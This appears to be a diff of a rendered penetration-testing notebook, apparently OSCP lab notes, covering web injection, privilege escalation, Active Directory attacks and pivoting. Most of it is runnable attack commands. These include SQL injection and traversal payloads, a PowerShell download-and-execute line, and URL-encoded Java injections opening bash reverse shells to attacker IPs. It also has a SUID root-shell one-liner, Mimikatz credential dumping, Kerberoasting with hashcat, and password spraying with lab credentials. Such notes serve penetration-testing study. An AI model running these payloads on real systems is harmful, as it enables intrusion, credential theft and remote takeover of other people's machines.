 <li><strong>Example</strong>: Change a query to <code>SELECT * FROM users WHERE username = 'admin' AND 1=1 --</code>. If the page loads normally, the query is true. If it doesn't, the query is false.</li>
 </ul>
-<h3 id="time-based-sql-injection"><a class="header" href="#time-based-sql-injection">Time-Based SQL Injection</a></h3>
+<h4 id="time-based-sql-injection"><a class="header" href="#time-based-sql-injection">Time-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Gather information from a database when no data is returned to the user.</li>
 <li><strong>Method</strong>: Use SQL commands that delay the response.</li>
 <li><strong>Example</strong>: <code>'; IF (SELECT COUNT(*) FROM users) &gt; 5 WAITFOR DELAY '0:0:10' --</code>. If the response is delayed, the statement is true.</li>
 </ul>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-libraries"><a class="header" href="#windows-libraries">Windows Libraries</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-libraries--abusing-apis"><a class="header" href="#windows-libraries--abusing-apis">Windows Libraries &amp; Abusing APIs</a></h2>
+<h3 id="windows-libraries"><a class="header" href="#windows-libraries">Windows Libraries</a></h3>
 <pre><code>pip3 install wsgidav
 /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous -root /home/kali/webdav/
 
@@ -3417,7 +3440,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 
 
 </code></pre>
-<h2 id="abusing-apis"><a class="header" href="#abusing-apis">Abusing APIs</a></h2>
+<h3 id="abusing-apis"><a class="header" href="#abusing-apis">Abusing APIs</a></h3>
 <p>I'd recommend reading it straight from the pen-200 guide. Essentially, through a series of commands it is discovered you can abuse an API to create a user.</p>
 <pre><code>#AbusingAPIs
 
@@ -3453,7 +3476,8 @@ curl -X 'PUT' \
 
 curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.208.16:5002/users/v1/login
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="links-3"><a class="header" href="#links-3">Links</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="xxe--xss--insecure-deserialization"><a class="header" href="#xxe--xss--insecure-deserialization">XXE &amp; XSS &amp; Insecure Deserialization</a></h2>
+<h3 id="links-10"><a class="header" href="#links-10">Links</a></h3>
 <ul>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XXE%20Injection/">PayLoad All The Things XXE</a></li>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/">PayLoad All The Things XSS</a></li>
@@ -3485,7 +3509,7 @@ change body of file to what it wants to see the 200
 
 
 </code></pre>
-<h2 id="xxs-injection"><a class="header" href="#xxs-injection">XXS Injection</a></h2>
+<h3 id="xxs-injection"><a class="header" href="#xxs-injection">XXS Injection</a></h3>
 <pre><code>This PHP function is responsible for parsing various HTTP request headers, including the UserAgent, which is saved in the useragent record value. Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the following portion of code from start.php:
 
 $i=count(VST_get_records($date_start, $date_finish)); foreach(VST_get_records($date_start, $date_finish) as $record) { echo ' &lt;tr class="active" &gt; &lt;td scope="row" &gt;'.$i.'&lt;/td&gt; &lt;td scope="row" &gt;'.date_format(date_create($record-&gt;datetime), get_option("links_updated_date_format")).'&lt;/td&gt; &lt;td scope="row" &gt;'.$record-&gt;patch.'&lt;/td&gt; &lt;td scope="row" &gt;&lt;a href="https://www.geolocation.com/es?ip='.$record&gt;ip.'#ipresult"&gt;'.$record-&gt;ip.'&lt;/a&gt;&lt;/td&gt; &lt;td&gt;'.$record-&gt;useragent.'&lt;/td&gt; &lt;/tr&gt;'; $i--; }
@@ -3493,7 +3517,7 @@ $i=count(VST_get_records($date_start, $date_finish)); foreach(VST_get_records($d
 </code></pre>
 <p><img src="XSSExample.png" alt="XSS Example" /></p>
 <p><img src="XSSFlowChart.png" alt="XSS Flow Chart" /></p>
-<h2 id="insecure-deserialization"><a class="header" href="#insecure-deserialization">Insecure Deserialization</a></h2>
+<h3 id="insecure-deserialization"><a class="header" href="#insecure-deserialization">Insecure Deserialization</a></h3>
 <pre><code>
 import pickle
 from base64 import urlsafe_b54encode as b64encode
@@ -3514,9 +3538,11 @@ Go to IP/newpost
 Change from GET to POST
 Just change content-type to text</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h2 id="directory-traversal"><a class="header" href="#directory-traversal">Directory Traversal</a></h2>
+<h3 id="links-11"><a class="header" href="#links-11">Links</a></h3>
 <ul>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/">Payload All The Things DT</a></li>
 </ul>
+<h3 id="directory-traversal-basics"><a class="header" href="#directory-traversal-basics">Directory Traversal Basics</a></h3>
 <pre><code>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
 
 
@@ -3551,10 +3577,12 @@ You can alternatively use Burp Intruder to test for directory traversal vulnerab
 7. When the attack is finished, study the responses to look for any noteworthy behavior. For example, look for responses with a longer length. These may contain data that has been returned from the requested file.
 8. 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="enumeration-1"><a class="header" href="#enumeration-1">Enumeration</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="linux-enumeration"><a class="header" href="#linux-enumeration">Linux Enumeration</a></h2>
 <p>I only transfer linpeas, if I am not able to find anything manually</p>
+<h3 id="links-12"><a class="header" href="#links-12">Links</a></h3>
 <ul>
 <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas.sh</a></li>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
 </ul>
 <h3 id="quick-wins"><a class="header" href="#quick-wins">Quick Wins</a></h3>
 <pre><code>ls -la /etc/passwd # See if you can write into /etc/passwd
@@ -3609,23 +3637,24 @@ locate flag.txt
 which flag.txt
 find / -name flag.txt &gt;2/dev/null
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h3 id="links-4"><a class="header" href="#links-4">Links</a></h3>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="linux-privesc-exploitation"><a class="header" href="#linux-privesc-exploitation">Linux PrivEsc Exploitation</a></h2>
+<h3 id="links-13"><a class="header" href="#links-13">Links</a></h3>
 <ul>
 <li><a href="https://github.com/SecWiki/linux-kernel-exploits">Linux Kernal Exploits</a></li>
 <li><a href="https://gtfobins.github.io/">GTFOBins</a></li>
 <li><a href="https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/">Password Loot</a></li>
 <li><a href="https://blog.certcube.com/restricted-shells-escaping-techniques-2/">Escape Restricted Shells</a></li>
 <li><a href="https://flast101.github.io/docker-privesc/">Docker PrivEsc</a></li>
-<li></li>
+<li><a href="https://github.com/DominicBreuker/pspy">PSPY</a></li>
 </ul>
-<h2 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel Exploits</a></h2>
+<h3 id="kernel-exploits"><a class="header" href="#kernel-exploits">Kernel Exploits</a></h3>
 <pre><code># Kernel Information
 uname -a 
 uname -r
 cat /proc/version
 cat /etc/issue
 </code></pre>
-<h2 id="suid"><a class="header" href="#suid">SUID</a></h2>
+<h3 id="suid"><a class="header" href="#suid">SUID</a></h3>
 <pre><code>find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre>
 <h3 id="insecure-file-perm"><a class="header" href="#insecure-file-perm">Insecure File Perm</a></h3>
@@ -3766,11 +3795,13 @@ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' &gt; 
 gcc /tmp/1/x.c -o /tmp/1/x
 chmod +s /tmp/1/x
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="automate"><a class="header" href="#automate">Automate</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-enumeration"><a class="header" href="#windows-enumeration">Windows Enumeration</a></h2>
+<h3 id="automate"><a class="header" href="#automate">Automate</a></h3>
 <ul>
 <li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
+<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a></li>
 </ul>
-<h2 id="manual"><a class="header" href="#manual">Manual</a></h2>
+<h3 id="manual"><a class="header" href="#manual">Manual</a></h3>
 <pre><code>
 whoami # username/hostname
 whoami /groups # check user is in which group
@@ -3812,7 +3843,7 @@ Get-History # Powershell History
 
 </code></pre>
 <h3 id="more-automate"><a class="header" href="#more-automate">More Automate</a></h3>
-<h2 id="powerup"><a class="header" href="#powerup">PowerUp</a></h2>
+<h3 id="powerup"><a class="header" href="#powerup">PowerUp</a></h3>
 <ol>
 <li>
 <p><strong>Download and Import the Script:</strong></p>
@@ -3861,7 +3892,8 @@ Get-History # Powershell History
 <p><code>Get-ModifiablePath</code></p>
 </li>
 </ol>
-<div style="break-before: page; page-break-before: always;"></div><h2 id="links-5"><a class="header" href="#links-5">Links</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="windows-privesc-exploitation"><a class="header" href="#windows-privesc-exploitation">Windows PrivEsc Exploitation</a></h2>
+<h3 id="links-14"><a class="header" href="#links-14">Links</a></h3>
 <ul>
 <li><a href="https://steflan-security.com/windows-privilege-escalation-runas-stored-credentials/">Run As Blog</a></li>
 <li><a href="https://github.com/BeichenDream/GodPotato">GodPotato</a></li>
@@ -3869,9 +3901,10 @@ Get-History # Powershell History
 <li><a href="https://juggernaut-sec.com/unquoted-service-paths/">Unquoted Service Path</a></li>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl">Payload All The Things Win Priv</a></li>
 <li><a href="https://4pfsec.com/offensive-windows-fodhelper-exe/">UAC Bypass Info</a></li>
-<li></li>
+<li><a href="https://wadcoms.github.io/#">WADComs</a></li>
+<li><a href="https://lolbas-project.github.io/">LOLBAS</a></li>
 </ul>
-<h2 id="quick-wins-1"><a class="header" href="#quick-wins-1">Quick Wins</a></h2>
+<h3 id="quick-wins-1"><a class="header" href="#quick-wins-1">Quick Wins</a></h3>
 <pre><code>whoami /priv # Printspoofer
 whoami /groups # UAC Bypass
 findstr /si password *.txt *.ini *.config # passwords # BREAKS THE SHELL A LOT # AVOID
@@ -4300,12 +4333,12 @@ Copy-FileSeBackupPrivilege C:\Users\enterpriseadmin\desktop\\flag.txt c:\users\e
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="we-got-users-but-no-pass"><a class="header" href="#we-got-users-but-no-pass">We got Users but no Pass?</a></h1>
-<h3 id="links-6"><a class="header" href="#links-6">Links</a></h3>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="we-got-users-but-no-pass"><a class="header" href="#we-got-users-but-no-pass">We got Users but no Pass?</a></h2>
+<h3 id="links-15"><a class="header" href="#links-15">Links</a></h3>
 <ul>
 <li><a href="https://github.com/GhostPack/Rubeus">GitHub Rubeus</a></li>
 </ul>
-<h4 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h4>
+<h3 id="asrep-roasting-attack"><a class="header" href="#asrep-roasting-attack">ASREP Roasting Attack</a></h3>
 <pre><code>impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt
 
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
@@ -4321,25 +4354,16 @@ cd C:\Tools
 
 sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 </code></pre>
-<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
-<pre><code>
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-cat hashes.kerberoast
-hashcat --help | grep -i "Kerberos"
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete
-
-sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
-
-
-</code></pre>
-<div style="break-before: page; page-break-before: always;"></div><ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="active-directory-enumeration"><a class="header" href="#active-directory-enumeration">Active Directory Enumeration</a></h2>
+<h3 id="links-16"><a class="header" href="#links-16">Links</a></h3>
+<ul>
 <li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file">S1ckB0y1337 Notes</a></li>
 <li><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Active%20Directory%20Attack/">Payload All the Things AD Attack</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li>
+<li><a href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a></li>
+<li><a href="https://github.com/hausec/Bloodhound-Custom-Queries">BloodHound Custom Queries</a></li>
+<li><a href="https://wadcoms.github.io/#">WADComs</a></li>
+<li><a href="https://lolbas-project.github.io/">LOLBAS</a></li>
 </ul>
 <h3 id="manual-enumeration-1"><a class="header" href="#manual-enumeration-1">Manual Enumeration</a></h3>
 <pre><code>Without PowerView:
@@ -4510,48 +4534,48 @@ net user robert Password123! /domain
 
 
 </code></pre>
-<h2 id="custom-bloodhound-queries"><a class="header" href="#custom-bloodhound-queries">Custom BloodHound Queries</a></h2>
-<h3 id="query-to-list-all-users"><a class="header" href="#query-to-list-all-users">Query to List All Users</a></h3>
+<h3 id="custom-bloodhound-queries"><a class="header" href="#custom-bloodhound-queries">Custom BloodHound Queries</a></h3>
+<h4 id="query-to-list-all-users"><a class="header" href="#query-to-list-all-users">Query to List All Users</a></h4>
 <p>This query returns all user objects in the Active Directory, which can be useful for identifying potential targets for further exploitation or reconnaissance.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (u:User) RETURN u.name</code></p>
-<h3 id="query-to-list-all-computers"><a class="header" href="#query-to-list-all-computers">Query to List All Computers</a></h3>
+<h4 id="query-to-list-all-computers"><a class="header" href="#query-to-list-all-computers">Query to List All Computers</a></h4>
 <p>This query returns all computer objects in the Active Directory. Identifying all computers can help in understanding the network's structure and identifying valuable targets for lateral movement or further exploitation.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (c:Computer) RETURN c.name</code></p>
-<h3 id="1-find-all-domain-admins"><a class="header" href="#1-find-all-domain-admins">1. Find All Domain Admins</a></h3>
+<h4 id="1-find-all-domain-admins"><a class="header" href="#1-find-all-domain-admins">1. Find All Domain Admins</a></h4>
 <p>Identify all users who are members of the Domain Admins group, which will give you insights into high-value targets within the network.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (g:Group)-[:MemberOf*1..]-&gt;(h:Group {name: 'Domain Admins@DOMAIN.COM'}) MATCH (u:User)-[:MemberOf]-&gt;(g) RETURN u.name</code></p>
-<h3 id="2-uncover-shortest-paths-to-domain-admins"><a class="header" href="#2-uncover-shortest-paths-to-domain-admins">2. Uncover Shortest Paths to Domain Admins</a></h3>
+<h4 id="2-uncover-shortest-paths-to-domain-admins"><a class="header" href="#2-uncover-shortest-paths-to-domain-admins">2. Uncover Shortest Paths to Domain Admins</a></h4>
 <p>Discover the shortest paths that could be exploited to elevate privileges to Domain Admin level. This can help in planning an attack route.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (u:User),(g:Group {name: 'Domain Admins@DOMAIN.COM'}), p = shortestPath((u)-[:MemberOf*1..]-&gt;(g)) RETURN p</code></p>
-<h3 id="3-identify-users-with-unconstrained-delegation-rights"><a class="header" href="#3-identify-users-with-unconstrained-delegation-rights">3. Identify Users with Unconstrained Delegation Rights</a></h3>
+<h4 id="3-identify-users-with-unconstrained-delegation-rights"><a class="header" href="#3-identify-users-with-unconstrained-delegation-rights">3. Identify Users with Unconstrained Delegation Rights</a></h4>
 <p>Users with unconstrained delegation rights can impersonate any user to any service. This query helps identify such users, presenting a significant security risk.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (u:User {allowedtodelegate: true}) RETURN u.name</code></p>
-<h3 id="4-find-computers-where-domain-admins-have-sessions"><a class="header" href="#4-find-computers-where-domain-admins-have-sessions">4. Find Computers Where Domain Admins Have Sessions</a></h3>
+<h4 id="4-find-computers-where-domain-admins-have-sessions"><a class="header" href="#4-find-computers-where-domain-admins-have-sessions">4. Find Computers Where Domain Admins Have Sessions</a></h4>
 <p>Identifying machines where Domain Admins have active sessions can be useful for moving laterally within the network.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (c:Computer)&lt;-[:HasSession]-(u:User) WHERE u.name CONTAINS 'Domain Admins@DOMAIN.COM' RETURN c.name, u.name</code></p>
-<h3 id="5-detect-all-kerberoastable-accounts"><a class="header" href="#5-detect-all-kerberoastable-accounts">5. Detect All Kerberoastable Accounts</a></h3>
+<h4 id="5-detect-all-kerberoastable-accounts"><a class="header" href="#5-detect-all-kerberoastable-accounts">5. Detect All Kerberoastable Accounts</a></h4>
 <p>Kerberoasting targets service accounts by requesting service tickets that can be cracked offline. This query finds service accounts that can be Kerberoasted.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (u:User {hasspn: true})  RETURN u.name</code></p>
-<h3 id="6-enumerate-acl-exploitation-paths"><a class="header" href="#6-enumerate-acl-exploitation-paths">6. Enumerate ACL Exploitation Paths</a></h3>
+<h4 id="6-enumerate-acl-exploitation-paths"><a class="header" href="#6-enumerate-acl-exploitation-paths">6. Enumerate ACL Exploitation Paths</a></h4>
 <p>Access Control List (ACL) exploitation can be a powerful method for escalating privileges. This query helps identify potential ACL exploit paths.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH p = (n)-[r:WriteDacl|WriteOwner|GenericAll|GenericWrite|Owns]-&gt;(m) RETURN p</code></p>
-<h3 id="7-find-all-trust-relationships"><a class="header" href="#7-find-all-trust-relationships">7. Find All Trust Relationships</a></h3>
+<h4 id="7-find-all-trust-relationships"><a class="header" href="#7-find-all-trust-relationships">7. Find All Trust Relationships</a></h4>
 <p>Understanding trust relationships between domains can reveal paths for lateral movement and privilege escalation.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (d:Domain)-[:TrustedBy]-&gt;(t:Domain) RETURN d.name, t.name</code></p>
-<h3 id="8-identify-orphaned-objects"><a class="header" href="#8-identify-orphaned-objects">8. Identify Orphaned Objects</a></h3>
+<h4 id="8-identify-orphaned-objects"><a class="header" href="#8-identify-orphaned-objects">8. Identify Orphaned Objects</a></h4>
 <p>Orphaned objects (users, computers) can sometimes retain privileges and be overlooked. This query helps spot such objects.</p>
 <p>cypherCopy code</p>
 <p><code>MATCH (n) WHERE NOT (n)-[:MemberOf]-&gt;() RETURN n.name, labels(n)</code></p>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="authentication"><a class="header" href="#authentication">Authentication</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="active-directory-authentication"><a class="header" href="#active-directory-authentication">Active Directory Authentication</a></h2>
 <h3 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h3>
 <pre><code>Cached Creds Storage -&gt; Retrieve stored cache pass.
 
@@ -4568,7 +4592,7 @@ sekurlsa::logonpasswords # Dumping hashes for logged on users using sekurlsa mod
 
 sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.
 </code></pre>
-<h3 id="kerberoasting-1"><a class="header" href="#kerberoasting-1">Kerberoasting</a></h3>
+<h3 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h3>
 <pre><code>Service Account Attack -&gt; Kerberoasting attack.
 
 # VERY USEFUL if the domain contains high-priv service account with weak pass.
@@ -4599,6 +4623,22 @@ Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &lt;'HTTP/CorpWebServer.corp.com'&gt; # PUT SPN HERE.
 klist # List all cached Kerberos tickets for current user.
 </code></pre>
+<h3 id="additional-notes-on-kerberoasting"><a class="header" href="#additional-notes-on-kerberoasting">Additional Notes on Kerberoasting</a></h3>
+<pre><code>
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+cat hashes.kerberoast
+hashcat --help | grep -i "Kerberos"
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.205.70 corp.com/pete
+
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+</code></pre>
 <h3 id="password-spraying"><a class="header" href="#password-spraying">Password Spraying</a></h3>
 <pre><code># Try on each user found on each IP in the domain.
 proxychains crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;passoword&gt;
@@ -4607,9 +4647,39 @@ proxychains crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;passoword&gt;
 net accounts # Check Lockout Threshold
 .\Spray-Passwords.ps1 -Pass &lt;password&gt; -Admin # Will Spray password on all Admin accounts.
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="pivoting"><a class="header" href="#pivoting">Pivoting</a></h1>
+<h3 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h3>
+<pre><code>
+xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.205.75
+net accounts
+
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = "LDAP://"
+$SearchString += $PDC + "/"
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
+
+cd C:\Tools
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+
+
+cat users.txt
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+
+type .\usernames.txt
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+
+Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="pivoting"><a class="header" href="#pivoting">Pivoting</a></h2>
 <p>A very Interesting and important concept - (Chisel + Proxychain)</p>
-<h3 id="links-7"><a class="header" href="#links-7">Links</a></h3>
+<h3 id="links-17"><a class="header" href="#links-17">Links</a></h3>
 <ul>
 <li><a href="https://github.com/nicocha30/ligolo-ng">Ligolo-ng</a></li>
 <li><a href="https://github.com/jpillora/chisel">Chisel</a></li>
@@ -4701,7 +4771,7 @@ smbclient -L //172.16.229.217/ -U hr_admin --password=Welcome1234
 
 
 </code></pre>
-<h2 id="windows-ssh"><a class="header" href="#windows-ssh">Windows SSH</a></h2>
+<h3 id="windows-ssh"><a class="header" href="#windows-ssh">Windows SSH</a></h3>
 <pre><code>
 sudo systemctl start ssh
 xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.229.64
@@ -4715,7 +4785,7 @@ socks5 127.0.0.1 9998
 proxychains psql -h 10.4.50.215 -U postgres
 \l
 </code></pre>
-<h2 id="socat-1"><a class="header" href="#socat-1">Socat</a></h2>
+<h3 id="socat-1"><a class="header" href="#socat-1">Socat</a></h3>
 <pre><code>
 curl http://192.168.232.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.239/4444%200%3E%261%27%29.start%28%29%22%29%7D/
 
@@ -4741,7 +4811,7 @@ socat TCP-LISTEN:2222,fork TCP:10.4.232.215:22
 ssh database_admin@192.168.232.63 -p2222
 
 </code></pre>
-<h2 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h2>
+<h3 id="ssh-local-port-forwarding"><a class="header" href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></h3>
 <pre><code>
 curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
 
@@ -4765,7 +4835,7 @@ smbclient -p 4455 //192.168.210.63/scripts -U hr_admin --password=Welcome1234
 get Provisioning.ps1
 
 </code></pre>
-<h2 id="ssh-dynamic-port-forwarding"><a class="header" href="#ssh-dynamic-port-forwarding">SSH Dynamic Port Forwarding</a></h2>
+<h3 id="ssh-dynamic-port-forwarding"><a class="header" href="#ssh-dynamic-port-forwarding">SSH Dynamic Port Forwarding</a></h3>
 <pre><code>
 curl http://192.168.210.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/4444%200%3E%261%27%29.start%28%29%22%29%7D/
 
@@ -4785,7 +4855,7 @@ proxychains nmap -vvv -sT -p4800-4900 -Pn 172.16.210.217
 By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
 
 </code></pre>
-<h2 id="ssh-remote-port-forwarding"><a class="header" href="#ssh-remote-port-forwarding">SSH Remote Port Forwarding</a></h2>
+<h3 id="ssh-remote-port-forwarding"><a class="header" href="#ssh-remote-port-forwarding">SSH Remote Port Forwarding</a></h3>
 <pre><code>
 sudo systemctl start ssh
 sudo ss -ntplu
@@ -4807,7 +4877,7 @@ quit
 
 
 </code></pre>
-<h2 id="ssh-remote-dynamic-port-forwarding"><a class="header" href="#ssh-remote-dynamic-port-forwarding">SSH Remote Dynamic Port Forwarding</a></h2>
+<h3 id="ssh-remote-dynamic-port-forwarding"><a class="header" href="#ssh-remote-dynamic-port-forwarding">SSH Remote Dynamic Port Forwarding</a></h3>
 <pre><code>
 curl http://192.168.229.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.222/4455%200%3E%261%27%29.start%28%29%22%29%7D/
 
@@ -4830,9 +4900,10 @@ ssh -R 1080 kali@192.168.45.196
 
 
 </code></pre>
+<h4 id="visual-examples-of-ssh-tunneling"><a class="header" href="#visual-examples-of-ssh-tunneling">Visual Examples of SSH Tunneling</a></h4>
 <p><img src="SSHDynamicReversePortForward.png" alt="SSH Dynamic Reverse Port Forward Example" /></p>
 <p><img src="SSHPortForward.png" alt="SSH Port Forward Example" /></p>
-<h2 id="plink"><a class="header" href="#plink">Plink</a></h2>
+<h3 id="plink"><a class="header" href="#plink">Plink</a></h3>
 <pre><code>
 sudo systemctl start apache2
 find / -name nc.exe 2&gt;/dev/null
@@ -4854,7 +4925,7 @@ ss -ntplu
 xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
 
 </code></pre>
-<h2 id="netsh"><a class="header" href="#netsh">Netsh</a></h2>
+<h3 id="netsh"><a class="header" href="#netsh">Netsh</a></h3>
 <pre><code>
 xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.208.64
 
@@ -4880,7 +4951,7 @@ netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.208.6
 
 
 </code></pre>
-<h2 id="bore"><a class="header" href="#bore">Bore</a></h2>
+<h3 id="bore"><a class="header" href="#bore">Bore</a></h3>
 <pre><code>rathole
 
 If you want to reverse shell, need two of these bad boys.
@@ -4951,7 +5022,7 @@ local_addr = "127.0.0.1:8000" # The address of the service that needs to be forw
 
 
 </code></pre>
-<h2 id="dns"><a class="header" href="#dns">DNS</a></h2>
+<h3 id="dns"><a class="header" href="#dns">DNS</a></h3>
 <pre><code>
 cd dns_tunneling
 cat dnsmasq.conf
@@ -4991,15 +5062,14 @@ listen 0.0.0.0:4646 172.16.229.217:4646
 
 
 </code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral Movement</a></h1>
-<h3 id="links-8"><a class="header" href="#links-8">Links</a></h3>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral Movement</a></h2>
+<h3 id="links-18"><a class="header" href="#links-18">Links</a></h3>
 <ul>
 <li><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">Pass the Hash</a></li>
 <li><a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#lateral-movement">AD Cheat Sheet</a></li>
-<li></li>
 </ul>
 <p>Hey, Why are you here? Do you have HASH or PASSWORD? Users Hash and Kerberos Ticket. Why crack Hashes and Passwords when you can pass them?</p>
